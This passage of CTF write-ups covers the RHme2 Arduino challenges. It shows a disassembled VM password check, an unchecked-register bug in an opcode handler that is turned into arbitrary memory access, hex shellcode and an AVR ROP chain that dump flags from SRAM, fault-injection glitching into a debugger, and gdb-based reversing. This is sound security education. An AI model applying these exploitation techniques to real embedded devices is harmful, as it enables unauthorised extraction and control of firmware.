00000290: 0A 42 0A 43 05 20 66 D7  04 20 DB 8E 16 24 13 00  .B.C. f.. ...$..
```

The next step is to disassemble this payload into something more useful. Luckily the board provides a built-in debugger that shows part of the disassembly.

After cleaning up the disassembly a bit the following can be obtained:

```
0000: 05002500   MOVH r0 #2500       
0004: 0400203a   MOVL r0 #203a       
0008: 0100       PUSH r0             
000a: 05006472   MOVH r0 #6472       
000e: 04006f77   MOVL r0 #6f77       
0012: 0100       PUSH r0             
0014: 05007373   MOVH r0 #7373       
0018: 04006150   MOVL r0 #6150       
001c: 0100       PUSH r0             
001e: 04500088   MOVL r5 #0088       
0022: 1250       CALL r5             
0024: 0306       MOV r0 SP           
0026: 0410000a   MOVL r1 #000a       
002a: 045000a8   MOVL r5 #00a8       
002e: 1250       CALL r5             
0030: 04500120   MOVL r5 #0120       
0034: 1250       CALL r5             
0036: 67         UNKNOWN             
0037: c6         UNKNOWN             
0038: 0540ffff   MOVH r4 #ffff       
003c: 0440ffee   MOVL r4 #ffee       
0040: 0d20       NOT r2              
0042: 1624       CMP r2 r4           
0044: 180012     JNZ #0x48           
0047: 13         RET                 
0048: 04500050   MOVL r5 #0050       
004c: 1250       CALL r5             
004e: 69         UNKNOWN             
004f: 73         UNKNOWN             
0050: 0a11       XOR r1 r1           
0052: 0410000a   MOVL r1 #000a       
0056: 05004500   MOVH r0 #4500       
005a: 04002174   MOVL r0 #2174       
005e: 0100       PUSH r0             
0060: 05006365   MOVH r0 #6365       
0064: 04007272   MOVL r0 #7272       
0068: 0100       PUSH r0             
006a: 05006f63   MOVH r0 #6f63       
006e: 04006e49   MOVL r0 #6e49       
0072: 0100       PUSH r0             
0074: 0306       MOV r0 SP           
0076: 045000a8   MOVL r5 #00a8       
007a: 0a44       XOR r4 r4           
007c: 1250       CALL r5             
007e: 140021     JMP #0x84           
0081: 00         NOP                 
0082: 00         NOP                 
0083: 00         NOP                 
0084: 140021     JMP #0x84           
0087: 51         UNKNOWN             
0088: 04100004   MOVL r1 #0004       
008c: 045000a8   MOVL r5 #00a8       
0090: 1d         UNKNOWN             
0091: 180026     JNZ #0x98           
0094: 13         RET                 
0095: ff         UNKNOWN             
0096: 4a         UNKNOWN             
0097: ec         UNKNOWN             
0098: 05002172   MOVH r0 #2172       
009c: 04007245   MOVL r0 #7245       
00a0: 0100       PUSH r0             
00a2: 0306       MOV r0 SP           
00a4: 1250       CALL r5             
00a6: 1f         EXIT                
00a7: 29         UNKNOWN             
00a8: 0120       PUSH r2             
00aa: 00         NOP                 
00ab: 00         NOP                 
00ac: 1614       CMP r1 r4           
00ae: 18002d     JNZ #0xb4           
00b1: 0220       POP r2              
00b3: 13         RET                 
00b4: 0620       MOV r2 [r0]         
00b6: 1c         UNKNOWN             
00b7: 20         UNKNOWN             
00b8: 04300001   MOVL r3 #0001       
00bc: 0803       ADD r0 r3           
00be: 0913       SUB r1 r3           
00c0: 14002b     JMP #0xac           
00c3: cd         UNKNOWN             
00c4: 0a22       XOR r2 r2           
00c6: 0100       PUSH r0             
00c8: 0110       PUSH r1             
00ca: 04500088   MOVL r5 #0088       
00ce: 1250       CALL r5             
00d0: 04500001   MOVL r5 #0001       
00d4: 0306       MOV r0 SP           
00d6: 0801       ADD r0 r1           
00d8: 0600       MOV r0 [r0]         
00da: 00         NOP                 
00db: 00         NOP                 
00dc: 1604       CMP r0 r4           
00de: 18003b     JNZ #0xec           
00e1: 04400000   MOVL r4 #0000       
00e5: 0861       ADD SP r1           
00e7: 0861       ADD SP r1           
00e9: 13         RET                 
00ea: ba         UNKNOWN             
00eb: ab         UNKNOWN             
00ec: 1b         READ_BYTE_TO_R3     
00ed: 30         UNKNOWN             
00ee: 0723       MOV [r2] r3         
00f0: 0825       ADD r2 r5           
00f2: 0905       SUB r0 r5           
00f4: 140037     JMP #0xdc           
00f7: f2         UNKNOWN             
00f8: 0a11       XOR r1 r1           
00fa: 04100008   MOVL r1 #0008       
00fe: 05002074   MOVH r0 #2074       
0102: 04006365   MOVL r0 #6365       
0106: 0100       PUSH r0             
0108: 05007272   MOVH r0 #7272       
010c: 04006f43   MOVL r0 #6f43       
0110: 0100       PUSH r0             
0112: 0306       MOV r0 SP           
0114: 045000a8   MOVL r5 #00a8       
0118: 0a44       XOR r4 r4           
011a: 1250       CALL r5             
011c: 1f         EXIT                
011d: fb         UNKNOWN             
011e: e3         UNKNOWN             
011f: 46         UNKNOWN             
0120: 04000011   MOVL r0 #0011       
0124: 045000c4   MOVL r5 #00c4       
0128: 1250       CALL r5             
012a: 04300002   MOVL r3 #0002       
012e: 04500038   MOVL r5 #0038       
0132: 1250       CALL r5             
0134: 0450018c   MOVL r5 #018c       
0138: 1250       CALL r5             
013a: 180061     JNZ #0x184          
013d: 045001b0   MOVL r5 #01b0       
0141: 1250       CALL r5             
0143: 180061     JNZ #0x184          
0146: 045001cc   MOVL r5 #01cc       
014a: 1250       CALL r5             
014c: 180061     JNZ #0x184          
014f: 0450020c   MOVL r5 #020c       
0153: 1250       CALL r5             
0155: 180061     JNZ #0x184          
0158: 04500234   MOVL r5 #0234       
015c: 1250       CALL r5             
015e: 180061     JNZ #0x184          
0161: 0450025c   MOVL r5 #025c       
0165: 1250       CALL r5             
0167: 180061     JNZ #0x184          
016a: 04500270   MOVL r5 #0270       
016e: 1250       CALL r5             
0170: 180061     JNZ #0x184          
0173: 04500288   MOVL r5 #0288       
0177: 1250       CALL r5             
0179: 180061     JNZ #0x184          
017c: 045000f8   MOVL r5 #00f8       
0180: 1250       CALL r5             
0182: 7c         UNKNOWN             
0183: c2         UNKNOWN             
0184: 04500050   MOVL r5 #0050       
0188: 1250       CALL r5             
018a: 54         UNKNOWN             
018b: f8         UNKNOWN             
018c: 04500088   MOVL r5 #0088       
0190: 1250       CALL r5             
0192: 0640       MOV r4 [r0]         
0194: 0d20       NOT r2              
0196: 10         UNKNOWN             
0197: 42         UNKNOWN             
0198: 05103d67   MOVH r1 #3d67       
019c: 041082a5   MOVL r1 #82a5       
01a0: 0a41       XOR r4 r1           
01a2: 05105dd5   MOVH r1 #5dd5       
01a6: 04103c4f   MOVL r1 #3c4f       
01aa: 1614       CMP r1 r4           
01ac: 13         RET                 
01ad: 1b         READ_BYTE_TO_R3     
01ae: e8         UNKNOWN             
01af: e7         UNKNOWN             
01b0: 0803       ADD r0 r3           
01b2: 0640       MOV r4 [r0]         
01b4: 05102325   MOVH r1 #2325       
01b8: 0410dbf8   MOVL r1 #dbf8       
01bc: 0841       ADD r4 r1           
01be: 0510536d   MOVH r1 #536d       
01c2: 04103b6d   MOVL r1 #3b6d       
01c6: 1614       CMP r1 r4           
01c8: 13         RET                 
01c9: 8d         UNKNOWN             
01ca: 76         UNKNOWN             
01cb: 5a         UNKNOWN             
01cc: 0803       ADD r0 r3           
01ce: 0640       MOV r4 [r0]         
01d0: 0a22       XOR r2 r2           
01d2: 04100010   MOVL r1 #0010       
01d6: 04500054   MOVL r5 #0054       
01da: 0e         UNKNOWN             
01db: 51         UNKNOWN             
01dc: 0c25       OR r2 r5            
01de: 04100000   MOVL r1 #0000       
01e2: 04500047   MOVL r5 #0047       
01e6: 0e         UNKNOWN             
01e7: 51         UNKNOWN             
01e8: 0c25       OR r2 r5            
01ea: 04100008   MOVL r1 #0008       
01ee: 04500030   MOVL r5 #0030       
01f2: 0e         UNKNOWN             
01f3: 51         UNKNOWN             
01f4: 0c25       OR r2 r5            
01f6: 04100018   MOVL r1 #0018       
01fa: 0450005f   MOVL r5 #005f       
01fe: 0e         UNKNOWN             
01ff: 51         UNKNOWN             
0200: 0c25       OR r2 r5            
0202: 0942       SUB r4 r2           
0204: 0a22       XOR r2 r2           
0206: 1624       CMP r2 r4           
0208: 11         UNKNOWN             
0209: 51         UNKNOWN             
020a: 13         RET                 
020b: 2e         UNKNOWN             
020c: 0450e2bd   MOVL r5 #e2bd       
0210: 0803       ADD r0 r3           
0212: 0640       MOV r4 [r0]         
0214: 05502059   MOVH r5 #2059       
0218: 0c15       OR r1 r5            
021a: 0a41       XOR r4 r1           
021c: 0a55       XOR r5 r5           
021e: 0450bde9   MOVL r5 #bde9       
0222: 0945       SUB r4 r5           
0224: 04500010   MOVL r5 #0010       
0228: 11         UNKNOWN             
0229: 45         UNKNOWN             
022a: 0450074c   MOVL r5 #074c       
022e: 0945       SUB r4 r5           
0230: 1624       CMP r2 r4           
0232: 13         RET                 
0233: 63         UNKNOWN             
0234: 04500088   MOVL r5 #0088       
0238: 1250       CALL r5             
023a: 0803       ADD r0 r3           
023c: 0640       MOV r4 [r0]         
023e: 04500013   MOVL r5 #0013       
0242: 11         UNKNOWN             
0243: 45         UNKNOWN             
0244: 05103815   MOVH r1 #3815       
0248: 0410cfb2   MOVL r1 #cfb2       
024c: 10         UNKNOWN             
024d: 150a       JMP r0x0            
024f: 41         UNKNOWN             
0250: 05109317   MOVH r1 #9317       
0254: 0410eee5   MOVL r1 #eee5       
0258: 1614       CMP r1 r4           
025a: 13         RET                 
025b: 33         UNKNOWN             
025c: 0803       ADD r0 r3           
025e: 0640       MOV r4 [r0]         
0260: 0941       SUB r4 r1           
0262: 0520d419   MOVH r2 #d419       
0266: 0420837a   MOVL r2 #837a       
026a: 1624       CMP r2 r4           
026c: 13         RET                 
026d: 9f         UNKNOWN             
026e: c9         UNKNOWN             
026f: 9a         UNKNOWN             
0270: 0803       ADD r0 r3           
0272: 0640       MOV r4 [r0]         
0274: 0812       ADD r1 r2           
0276: 0914       SUB r1 r4           
0278: 11         UNKNOWN             
0279: 10         UNKNOWN             
027a: 0540b2ef   MOVH r4 #b2ef       
027e: 04402c90   MOVL r4 #2c90       
0282: 1614       CMP r1 r4           
0284: 13         RET                 
0285: 66         UNKNOWN             
0286: 32         UNKNOWN             
0287: 0d08       NOT r0              
0289: 0306       MOV r0 SP           
028b: 40         UNKNOWN             
028c: 0a40       XOR r4 r0           
028e: 0a41       XOR r4 r1           
0290: 0a42       XOR r4 r2           
0292: 0a43       XOR r4 r3           
0294: 052066d7   MOVH r2 #66d7       
0298: 0420db8e   MOVL r2 #db8e       
029c: 1624       CMP r2 r4           
029e: 13         RET                                
```

The relevant parts of this disassembly are as follows:

```
0120: 04000011   MOVL r0 #0011
0124: 045000c4   MOVL r5 #00c4
0128: 1250       CALL r5 => Read password
012a: 04300002   MOVL r3 #0002
012e: 04500038   MOVL r5 #0038
0132: 1250       CALL r5 => Check length (r4 = 0x11)
0134: 0450018c   MOVL r5 #018c
0138: 1250       CALL r5
```

This basically checks the length of the input.

After this more checks are done:

```
018c: 04500088   MOVL r5 #0088       
0190: 1250       CALL r5             
0192: 0640       MOV r4 [r0]         
0194: 0d20       NOT r2              
0196: 10         UNKNOWN             
0197: 42         UNKNOWN             
0198: 05103d67   MOVH r1 #3d67       
019c: 041082a5   MOVL r1 #82a5       
01a0: 0a41       XOR r4 r1           
01a2: 05105dd5   MOVH r1 #5dd5       
01a6: 04103c4f   MOVL r1 #3c4f       
01aa: 1614       CMP r1 r4           
01ac: 13         RET                 
```

After some analysis it was found the 1042 opcode is actually ROL r4,r2 which in this case is ROL r4, 17

The complete check is:
`rol(input,17)^0x3d6782a5 == 0x5dd53c4f`

So this means that input should be: `ror(0x3d6782a5 ^ 0x5dd53c4f,17)) = 0x5f753059` which corresponds to the string `Y0u_`

Following this same analysis a bit further yields the complete flag: ```Y0u_G0T_1t_r1ght!```

# Other 400 - Hide and Seek

The following description is given for this challenge:

> So you found the password last time? This time it got a little bit harder. Instead of hiding it in the VM, it is somewhere else on the device. Are you able to find it?

This time there is only an encrypted firmware file. Basically it still allows us to run a FridgeJIT firmware that we supply.

After trying some obvious things such as writing a small program that dumps the VM memory no flag was found. As the challenge description suggests it is somewhere else in the device.

I analyzed some of the opcode handlers for obvious flaws and found the following in the handler of the XOR opcode (opcode 0x0a):

```
   0x127c:      andi    r25, 0x0F       ; 15
   0x127e:      movw    r30, r28
   0x1280:      ldi     r18, 0x04       ; 4
   0x1282:      mul     r25, r18
   0x1284:      add     r30, r0
   0x1286:      adc     r31, r1
   0x1288:      eor     r1, r1
   0x128a:      andi    r24, 0x0F       ; 15
   0x128c:      movw    r26, r28
   0x128e:      ldi     r25, 0x04       ; 4
   0x1290:      mul     r24, r25
   0x1292:      add     r26, r0
   0x1294:      adc     r27, r1
   0x1296:      eor     r1, r1
   0x1298:      ld      r20, Z
   0x129a:      ldd     r21, Z+1        ; 0x01
   0x129c:      ldd     r22, Z+2        ; 0x02
   0x129e:      ldd     r23, Z+3        ; 0x03
   0x12a0:      ld      r24, X+
   0x12a2:      ld      r25, X+
   0x12a4:      ld      r0, X+
   0x12a6:      ld      r27, X
   0x12a8:      mov     r26, r0
   0x12aa:      eor     r24, r20
   0x12ac:      eor     r25, r21
   0x12ae:      eor     r26, r22
   0x12b0:      eor     r27, r23
   0x12b2:      st      Z, r24
   0x12b4:      std     Z+1, r25        ; 0x01
   0x12b6:      std     Z+2, r26        ; 0x02
   0x12b8:      std     Z+3, r27        ; 0x03
```

The XOR opcode is encoded as follows: ```0a<r1><r2>```, for example ```0a25``` means ```XOR r2, r5``` the flaw is that in the virtual architecture only 8 registers exist (r0-r7) however we can specify registers up to 0xf no check is done. The source and destination registry number are simply multiplied by 4 and added to a base value. This means we can overwrite values in memory using the XOR instruction.

The memory layout is as follows:

```
0x59a = r0
0x59e = r1
0x5a2 = r2
0x5a6 = r3
0x5aa = r4
0x5ae = r5
0x5b2 = r6
0x5b6 = r7
0x5ba = r8 = base address for MOV r, [address]
```

So by writing to r8 we can overwrite the base address for VM memory access. After changing this base address we can read and write arbitrary memory using the MOV r, [address] and MOV [address], r instructions.

In order to work with the Fridge architecture in a more efficient way I wrote a [small assembler](asm.py) that can be used to craft shellcode.

Using this assembler we can write shellcode that dumps the entire memory by setting the base address pointer to 0, dumping 0x100 bytes and then increasing the base address pointer by 0x100.

```
from asm import *
r = ""
r += mov(r5,r8)
# r5 now contains the base address
r += label('inc_mem_base',r)
r += xor(r4,r4)
r += movh(r4,0x1)
r += add(r5,r4)
r += xor(r8,r8)
r += xor(r8,r5)

r += xor(r1,r1)
r += movl(r1,0x100)
r += xor(r3,r3)
r += xor(r4,r4)
r += movl(r4,1)
r += label('dump',r)
r += lodsb(r2,r3)
r += write(r2)
r += add(r3,r4) # r3 += 1
r += cmp(r3,r1) # 0x100
r += jnz('dump')
r += jmp('inc_mem_base')
print r
```

When we run this we obtain the following shellcode:
```
035800000a440540000108540a880a850a11041001000a330a4404400001000006231c2008341631180008140001
```

When we run this on the board we get the flag:

```
FLAG:67e0d654a05ee5533e8d57e9e53f3bb9
```


# Exploit 400 - Weird Machine

The following description is given for this challenge:


> Damn fridges. It seems there is no end to the problems they bring. And this time time it got even more difficult. I guess you already know in which direction this goes, right?


Given that this challenge is in the category exploitation it seems likely that we need to use the vulnerabilities found in the previous step to gain full code execution outside of the VM.

We already have a 'read memory' and 'write memory' gadget so this should not be so hard. In order to achieve this we need to know some specifics about the AVR architecture:

* Program memory and SRAM are separated and accessed using different instructions.
* It is not possible to execute code from SRAM, code can only be executed from Flash memory.
* All registers are memory mapped into SRAM, see [Wikipedia](https://en.wikipedia.org/wiki/Atmel_AVR_instruction_set#Addressing) for mapping details.

Since code can only be executed from flash and not from SRAM the only option left to use is using ROP.

The idea is as follows:

* Write a ROP chain somewhere in memory
* Overwrite the stack pointer (SP) using it's memory mapped location 0x5D using the virtual MOV instruction
* The RET instruction in the virtual MOV instruction handler will now jump into the ROP chain.
* Find some gadgets to dump what we need: Flash, SRAM and EEPROM to see where the flag is hidden.

One of the issues we are left with is that we don't have the binary so it will be hard to find any gadgets. However we do have the binary for the 'FridgeJIT' challenge which is likely to be very similar.

Let's start by making a ROP chain using the FridgeJIT binary and see if we can port it to the actual challenge later.

We can find the following gadgets that are useful to dump SRAM and Flash:

```
print_string_addr_r24_from_ram
     47c:       cf 93           push    r28
     47e:       df 93           push    r29
     480:       ec 01           movw    r28, r24
     482:       89 91           ld      r24, Y+
     484:       88 23           and     r24, r24
     486:       19 f0           breq    .+6     ;  0x48e
     488:       0e 94 df 01     call    0x3be   ;  serial_print char r24
     48c:       fa cf           rjmp    .-12    ;  0x482
     48e:       df 91           pop     r29
     490:       cf 91           pop     r28
     492:       08 95           ret

print_string_addr_r24_from_flash
     494:       cf 93           push    r28
     496:       df 93           push    r29
     498:       fc 01           movw    r30, r24
     49a:       84 91           lpm     r24, Z
     49c:       ef 01           movw    r28, r30
     49e:       21 96           adiw    r28, 0x01   
     4a0:       88 23           and     r24, r24
     4a2:       21 f0           breq    .+8     ;  0x4ac
     4a4:       0e 94 df 01     call    0x3be   ;  serial_print char r24
     4a8:       fe 01           movw    r30, r28
     4aa:       f7 cf           rjmp    .-18    ;  0x49a
     4ac:       df 91           pop     r29
     4ae:       cf 91           pop     r28
     4b0:       08 95           ret

movw_r24_r16_pop_4
     4ea:       c8 01           movw    r24, r16
     4ec:       df 91           pop     r29
     4ee:       cf 91           pop     r28
     4f0:       1f 91           pop     r17
     4f2:       0f 91           pop     r16
     4f4:       08 95           ret
     
pop_r17_r16:
     4f0:       1f 91           pop     r17
     4f2:       0f 91           pop     r16
     4f4:       08 95           ret
```

These can be turned into a ROP chain as follows:

```
chain = [
         pop_r17_r16, # Read word r16:r17 from next value in chain
         swap(addr+len(dmp)), # Byte swapped version of the address we want to read
         movw_r24_r16_pop_4, # Load word r24:r25 from r16:r17
         0xdead, # consumed by pop_4
         0xbeef, # consumed by pop_4
         print_string_addr_r24_from_ram # Call print string at r24:r25 from SRAM
         ]
```

This ROP chain works fine in gdb using the firmware provided. The last trick that I found out after hours of head breaking is that the gadgets have shifted by 18 words in the weird machine binary compared to the fridge_jit one.

Once we factor that offset of 18 into the address [the exploit](weird_machine.py) works and dumps the flag from address 0x700.

```
Connecting...
00000000: 46 4C 41 47 3A 32 39 32  61 33 62 64 64 39 34 35  FLAG:292a3bdd945
00000010: 32 34 33 62 30 35 36 30  32 32 63 34 31 63 39 38  243b056022c41c98
00000020: 37 33 35 65 99 00                                 735e..
```

I used this same exploit to dump the Flash, which worked fine but unfortunately it is not possible to read the bootloader this way since the bootloader cannot be read using the LPM instruction from outside of the bootloader :(

# Fault injection 300 - Revenge

The following description is given for this challenge:

> The same manager that last time demanded field upgradable software is now asking the development team for an explanation as to why so many users have been able to hack their own fridge. The manager is also asking the legal department if they could sue every single user, but they responded that users are free to do as they want with their own equipment.
> 
> This is not acceptable, so the manager threatens to fire everybody unless they solve this major issue before coming Monday. How they resolve it is up to them, as long as it is sorted in the given time frame.
> 
> But is the solution sufficient?
> 
> Keep in mind that FI can be risky. If you brick your Arduino the game is over. Hence, you should try this challenge after you are done with the other challenges.

What has changed from before is that now each program includes some sort of a signature making it no longer possible to run our own programs without obtaining a valid signature.

There is one example program with a valid signature provided that we can use to at least run something on the board.

I first tried for quite a while to glitch the board into accepting an invalid signature but had no luck with this.

I had success very quickly when I switched to another technique using something I had seen in the previous fridge challenges: some errors during execution cause the program to drop into a 'FridgeJIT debugger' that can be used to single step the program and load new firmware.

I wrote a [small Arduino program to do the glitching](arduino_glitch_revenge.c) which basically sends the valid program to the board waits a while until the program is running and then sends some glitches, hoping to drop into the debugger.

Running this for a few minutes indeed dropped me into the debugger:

```
Oops!
[ FridgeJIT Console ]
>>
>>
>>
```

Now the only thing left is to run something from the debugger. I used a payload similar to that of hide and seek to dump the flag from SRAM at location 0x700 where it also was in all previous parts of this challenge.

```
Oops!
[ FridgeJIT Console ]
>>
>>
>> l
Loader> 05000007040000000a880a800a11041001000a220a4404400001000006321c3008241621180007

[ FridgeJIT Console ]

/---------------------------------\   /---------------------------\
| >> 0000: 05000007 MOVH r0 #0007 |   | R0: 00000000 R4: 00000000 |
|    0004: 04000000 MOVL r0 #0000 |   | R1: 00000000 R5: 00000000 |
|    0008: 0a88     XOR r0 r0     |   | R2: 00000000 SP: 00000100 |
|    000a: 0a80     XOR r0 r0     |   | R3: 00000000 IP: 00000000 |
|    000c: 0a11     XOR r1 r1     |   | Z:  0        C:  0        |
\---------------------------------/   \---------------------------/

>> e
FLAG:9fd67981eb653dfc03c654ac0f05ff
```


### File: rhme2_writeups/reversing/README.md

# Reversing 100 - Jumpy

The following description is given for this challenge:


> We really need access to this lab protected with an Arduino-based access control system. Our operatives obtained a flash dump from a non-personalized engineering sample, but we are having trouble reverse engineering it.
> 
> Can you help us get the password to get through?

Interacting with the board only yields an Input prompt, followed by 'Better luck next time!' every time some input is tried.

```
Input: test

Better luck next time!
```

For this challenge the unencrypted firmware file is provided so it can be analyzed. Like with any reverse engineering challenge it would be most interesting if static and dynamic analysis can be combined. For dynamic analysis it would be most conveniant to have an emulator that can interface with gdb. Luckily such an emulator exists in the form of [simavr](https://github.com/buserror/simavr/tree/master/examples/board_simduino) combined with the 'simduino' example which emulates an Arduino. 

The simduino binary will boot a provided flash ROM image.

Loading the Jumpy binary can either be done by flashing it to simduino or by creating a 'pre-flashed' flash ROM image. The pre-flashed image is much faster. The [srec_cat](http://srecord.sourceforge.net/) tool can be used to combine the bootloader image with the challenge binary.

```
srec_cat ATmegaBOOT_168_atmega328.ihex -intel Jumpy.bin -binary -o combined.hex -intel
```

The resulting 'combined.hex' file can be loaded in simduino:

```
% simduino -v -d combined.hex
read_ihex_chunks: combined.hex, unsupported check type 05
AVR: 'combined.hex' ihex contains more chunks than loaded (2)
atmega328p booloader 0x00000: 3574 bytes
avr_special_init
avr_gdb_init listening on port 1234
uart_pty_init bridge on port *** /dev/ttys009 ***
uart_pty_connect: /tmp/simavr-uart0 now points to /dev/ttys009
note: export SIMAVR_UART_XTERM=1 and install picocom to get a terminal
```

In order to get the application to run we need to attach to it using avr-gdb:

```
% /Applications/Arduino.app/Contents/Java/hardware/tools/avr/bin/avr-gdb -q
(gdb) target remote localhost:1234
Remote debugging using localhost:1234
0x00000000 in ?? ()
(gdb) c
Continuing.
```

After running this the program shows output via the /tmp/simavr-uart0 emulated serial port.

```
% picocom -fh -b19200 /tmp/simavr-uart0
Terminal ready
Input:
Better luck next time!
```

AVR is an architecture a bit different to generic Intel or ARM. 

In order to facilitate debugging I created a gdb init script [init.gdb](init.gdb). This script provides the following AVR specific functionality:

* Each time the program hits a breakpoint the AVR context r16-r30 is shown including all the AVR registers. It will also show the value of the 'meta registers X, Y and Z' which are used as data pointers in various instructions.
* A disassembly is shown automatically.
* Internally the AVR uses word aligned addresses, some tools will also use these addresses.
* GDB's standard break function does not work properly, to replace it I have created to convenience functions ab (AVR break) and wb (Word break) which can be used to set breakpoints at an AVR address or a word aligned address.

With this init.gdb file AVR debugging using avr-gdb and simduino is possible.

In order to solve the challenge the program needs to be reverse engineered. First we need to understand how the program reads it's input string to memory and where it will be stored.

To figure this out I used the following technique:

* Make sure the program is in the input loop before we press enter.
* Hit ctrl-c in gdb to pause the program
* Step through the program using the gdb single step ('nexti') function
* Identify how input is read.

Doing this yields the following piece of AVR assembly code:

```
   0x2b2:       call    0x288   ;  0x288
=> 0x2b6:       and     r24, r24
   0x2b8:       breq    .-8             ;  0x2b2
   0x2ba:       ldi     r24, 0xC6       ; 198
   0x2bc:       ldi     r25, 0x00       ; 0
   0x2be:       movw    r30, r24
   0x2c0:       ld      r24, Z
   0x2c2:       pop     r29
   0x2c4:       pop     r28
   0x2c6:       ret
```

Basically this code keeps calling the function at 0x288 until it returns a non-zero value in r24. Once it returns a non-zero value in r24 the it does some magic and loads a value from memory into register r24 and returns. It is assumed that this will be the input.

We can test this assumption by putting a breakpoint on 0x2c6 the function return instruction, typing something into the virtual serial port and seeing if the value we type indeed ends up in r24.

We set the breakpoint using the 'ab' function from init.gdb

```
(gdb) ab 0x2c6
Breakpoint 1 at 0x2c6
(gdb) c
Continuing.
```

Now we type the letter X into the virtual serial port and observe indeed the breakpoint is triggered:

```
Note: automatically using hardware breakpoints for read-only addresses.
   0x2bc:       ldi     r25, 0x00       ; 0
   0x2be:       movw    r30, r24
   0x2c0:       ld      r24, Z
   0x2c2:       pop     r29
   0x2c4:       pop     r28
=> 0x2c6:       ret
<SNIP>
Word PC: 0x163 r16: 0x0 r17: 0x1 r18: 0x0 r19: 0xff r20: 0x7f r21: 0x8e r22: 0xa0 r23: 0xf r24: 0x58 r25: 0x0 r26: 0x0 r27: 0x0 r28: 0xf2 r29: 0x2 r30: 0xc6 X: 0x0000 Y: 0x02f2 Z: 0x00c6
```

The value of the input character X which corresponds to ASCII character 0x58 ends up in r24. Meaning that we correctly identified the function which reads a single character from the serial input.

If we continue the program with a single instruction the ret instruction is executed and the context where the input is read can be seen:

```
   0x2da:       call    0x2a8   ;  0x2a8
=> 0x2de:       std     Y+3, r24        ; 0x03
   0x2e0:       ldd     r24, Y+3        ; 0x03
   0x2e2:       cpi     r24, 0x0A       ; 10
   0x2e4:       breq    .+38            ;  0x30c
   0x2e6:       ldd     r24, Y+3        ; 0x03
   0x2e8:       cpi     r24, 0x0D       ; 13
   0x2ea:       breq    .+32            ;  0x30c
<SNIP>
Word PC: 0x16f r16: 0x0 r17: 0x1 r18: 0x0 r19: 0xff r20: 0x7f r21: 0x8e r22: 0xa0 r23: 0xf r24: 0x58 r25: 0x0 r26: 0x0 r27: 0x0 r28: 0xf2 r29: 0x2 r30: 0xc6 X: 0x0000 Y: 0x02f2 Z: 0x00c6
```

This shows that the input is stored on address Y+3 which corresponds to 0x02f2+3 = 0x02f5. The code repeats reading an input character until an enter (0x0a or 0x0d) is read. Once an enter is pressed it will jump to address 0x30c to process the input.

Unfortunately there is a bug in simduino that causes only the first input byte on the serial port to be properly read. We can work around this bug by providing the input via gdb instead of via the serial port.

To simulate input via gdb I cooked up the following gdb script:

```
set $input_str = "ABC\n"
set $input_count = 0

# Fake a character was pressed
ab 0x2b6
commands
    silent
    set $r24 = 0x1
    c
end

ab 0x2c2
commands
    silent
    set $r24 = $input_str[$input_count]
    printf "Sending fake input: %c\n", $r24
    set $input_count = $input_count + 1
    c
end
```

This will send the string ABC\n to the board.

We can now run the program until it detects the \n in the input by putting a breakpoint at 0x30c:

```
Breakpoint 1 at 0x2b6
Breakpoint 2 at 0x2c2
(gdb) ab 0x30c
Breakpoint 3 at 0x30c
(gdb) c
<SNIP>
=> 0x30c:       ldd     r24, Y+1        ; 0x01
   0x30e:       ldd     r25, Y+2        ; 0x02
   0x310:       subi    r24, 0xD2       ; 210
   0x312:       sbci    r25, 0xFE       ; 254
   0x314:       movw    r30, r24
   0x316:       st      Z, r1
   0x318:       pop     r0
   0x31a:       pop     r0
   0x31c:       pop     r0
   0x31e:       pop     r29
   0x320:       pop     r28
   0x322:       ret
```

We can continue executing this for a while using single step until we get to the first check on the input:

```
   0x346:       ld      r24, Z
   0x348:       and     r24, r24
   0x34a:       brne    .-24            ;  0x334
   0x34c:       ldd     r24, Y+1        ; 0x01
=> 0x34e:       cpi     r24, 0x0D       ; 13
```

This code calculates the length of the input and compares it to 13. Now we know the correct password should have a length of 13 characters.

In input.gdb update ```set $input_str = "ABC\n"``` to ```set $input_str = "ABCDEFGHIJKLM\n"```

Now we can run the code again to see what the next check after this input length = 13 will be.

The next check we found is this:

```
=> 0x37a:       in      r28, 0x3d       ; 61
   0x37c:       in      r29, 0x3e       ; 62
   0x37e:       lds     r24, 0x0135
   0x382:       mov     r18, r24
   0x384:       ldi     r19, 0x00       ; 0
   0x386:       lds     r24, 0x0136
   0x38a:       mov     r24, r24
   0x38c:       ldi     r25, 0x00       ; 0
   0x38e:       add     r24, r18
   0x390:       adc     r25, r19
   0x392:       cpi     r24, 0xD3       ; 211
   0x394:       cpc     r25, r1
   0x396:       brne    .+20            ;  0x3ac
```

This code reads a byte from memory address 0x0135 and from address 0x0136 these values are added together and compared with 0xd3.

We can see what is at these addresses as follows:
```
(gdb) x/s 0x0135
0x800135:       "HIJKLM"
(gdb) x/s 0x0136
0x800136:       "IJKLM"
```

So what the check does is add input byte 7 and input byte 8 and check if this is equal to 0xd3. Converted to python this check is ```i[7] + i[8] == 0xd3```

For now we can fake this check is passed by putting a breakpoint at 0x392 and modifying the r24 register to 0xd3 so the check will pass.

```
(gdb) ab 0x392
Breakpoint 4 at 0x392
(gdb) c
<SNIP>
Breakpoint 4, 0x00000392 in ?? ()
(gdb) set $r24 = 0xd3
```

After stepping a bit more we can find a second check:

```
=> 0x6c4:       lds     r24, 0x0136
   0x6c8:       mov     r20, r24
   0x6ca:       ldi     r21, 0x00       ; 0
   0x6cc:       lds     r24, 0x0137
   0x6d0:       mov     r18, r24
   0x6d2:       ldi     r19, 0x00       ; 0
   0x6d4:       mul     r20, r18
   0x6d6:       movw    r24, r0
   0x6d8:       mul     r20, r19
   0x6da:       add     r25, r0
   0x6dc:       mul     r21, r18
   0x6de:       add     r25, r0
   0x6e0:       eor     r1, r1
   0x6e2:       cpi     r24, 0xC0       ; 192
   0x6e4:       sbci    r25, 0x15       ; 21
   0x6e6:       brne    .+20            ;  0x6fc
```

Translating this check to python yields: ```i[8] * i[9] == 0x15c0```

By repeating this same flow a number of times we can record all the checks that are performed, these turn out to be:

```
i[7] + i[8] == 0xd3
i[8] * i[9] == 0x15c0
i[0] * i[1] == 0x13b7
i[2] * i[3] == 0x1782
i[3] + i[4] == 0x92
i[6] * i[7] == 0x2b0c
i[5] + i[6] == 0xa5
i[9] + i[10] == 0x8f
i[1] + i[2] == 0xa7
i[10] * i[11] == 0x2873
i[12] * 13 == 0x297
i[4] * i[5] == 0x122f
i[11] + i[12] == 0xa0
```

Using z3 an input string that satisfies all these checks can be found easily. Refer to [jumpy.py](jump.py) for full solution.

```
% python jumpy.py
g1v3_1t_t0_m3
```

Entering this string into the simulator yields an empty flag on the real board it yields the flag:

```
Input: g1v3_1t_t0_m3
